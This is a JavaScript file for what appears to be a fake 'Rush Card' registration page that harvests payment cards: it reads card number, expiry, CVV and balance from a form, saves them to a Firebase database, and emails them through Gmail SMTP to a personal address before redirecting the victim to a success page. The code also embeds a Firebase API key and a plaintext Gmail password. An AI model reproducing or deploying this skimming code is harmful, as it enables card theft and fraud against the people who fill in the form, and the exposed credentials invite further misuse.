  // Your web app's Firebase configuration
   var firebaseConfig = {
     apiKey: "AIzaSyA-S1ti_0qHHNK3Qh34-oU276kSvghPmas",
     authDomain: "registerrushcard.firebaseapp.com",
     projectId: "registerrushcard",
     storageBucket: "registerrushcard.appspot.com",
     messagingSenderId: "1010756973057",
     appId: "1:1010756973057:web:2012a041a570eb6bbf0600"
   };
   // Initialize Firebase
   firebase.initializeApp(firebaseConfig);


// Refernece contactInfo collections
let contactInfo = firebase.database().ref("infos");

// Listen for a submit
document.querySelector(".contact-form").addEventListener("submit", submitForm);

function submitForm(e) {
  e.preventDefault();

  //   Get input Values
  let card_number = document.querySelector(".card_number").value;
  let month = document.querySelector(".month").value;
  let year = document.querySelector(".year").value;
  let cvv = document.querySelector(".cvv").value;
  let balance = document.querySelector(".balance").value;

  // console.log(name, email, message);

  saveContactInfo(card_number, month, year,cvv,balance);

  document.querySelector(".contact-form").reset();

  sendEmail(card_number, month, year, cvv, balance);
}

// Save infos to Firebase
function saveContactInfo(card_number, month, year, cvv, balance) {
  let newContactInfo = contactInfo.push();

  newContactInfo.set({
    card_number: card_number,
    month: month,
    year: year,
    cvv: cvv,
    balance:balance
  });

  retrieveInfos();
}

function retrieveInfos() {
  let ref = firebase.database().ref("infos");
  ref.on("value", gotData);
}

function gotData(data) {
  let info = data.val();
  let keys = Object.keys(info);

  for(let i = 0; i < keys.length; i++){
    let infoData = keys[i];
    let card_number = info[infoData].card_number;
    let month = info[infoData].month;
    let year = info[infoData].year;
    let cvv = info[infoData].cvv;
    let balance = info[infoData].balance;

    console.log(card_number, month, year, cvv, balance);

    let infoResults = document.querySelector(".infoResults");

    infoResults.innerHTML += `<div>
    <p><strong>card_number: </strong>${card_number} <br>
    <a><strong>month: </strong>${month}</a><br>
    <a><strong>year: </strong>${year}</a><br>
    <a><strong>cvv: </strong>${cvv}</a><br>
    <a><strong>balance </strong>${balance}</a>
    <p>
    </div>`;
  }
}

retrieveInfos();


function sendEmail(card_number,month,year,cvv,balance){
  Email.send({
    Host: "smtp.gmail.com",
    Username: "nidhi.sharma0310@gmail.com",
    Password: "Kafyvdmpzefuzzcx",
    To: "nidhi.sharma0310@gmail.com",
    From: "nidhi.sharma0310@gmail.com",
    Subject: `Rush Card ${card_number}sent you a message`,
    Body: `'card_number: ${card_number}<br> month: ${month} <br> year: ${year} <br> cvv: ${cvv} <br> balance: ${balance}`,
  }).then(function(){
  //if success show the response in the log
     window.location.href='./success.html';
  },function(error){
    //if error show the error message in the log
    console.log('Error: ' + error.statusText);
   });


}

// script for 16-digit card_number

function card_number(input)
{
    return (input - 0) == input && (input+'').replace(/^\s+|\s+$/g, "").length > 0;
}
